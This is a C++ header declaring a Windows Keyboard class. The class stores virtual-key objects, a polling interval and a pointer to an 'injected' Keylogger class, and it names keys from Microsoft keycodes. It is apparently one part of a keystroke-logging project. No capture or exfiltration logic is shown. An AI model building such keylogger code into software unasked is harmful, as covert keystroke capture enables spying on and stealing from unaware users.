#pragma once
#include <thread>
#include "key.h"

#define KEYBOARDSIZE 255
typedef std::chrono::milliseconds milliseconds;
#define sleep(time) std::this_thread::sleep_for(time)

class Keyboard {
	private:
	//An array with all the Windows API keys
	Key** keys;

	public:
	//The refresh rate of the keyboard. Used with the injected Keylogger class.
	milliseconds polling;
	//Initialized with the Keyboard initialization
	Keylogger* keylogger;

	//Creates a standard Ansi keyboard and initializes the local Keylogger class
	Keyboard();

	//Returns keys
	Key** getKeys() const;
	
	//Describe Ansi keys with Microsoft keycodes
	//Doesn't describe redundant keys, as in CTRL, LCTRL and RCTRL (doesn't describe CTRL)
	static std::string describeKey(BYTE vk);

	friend class Keylogger;
};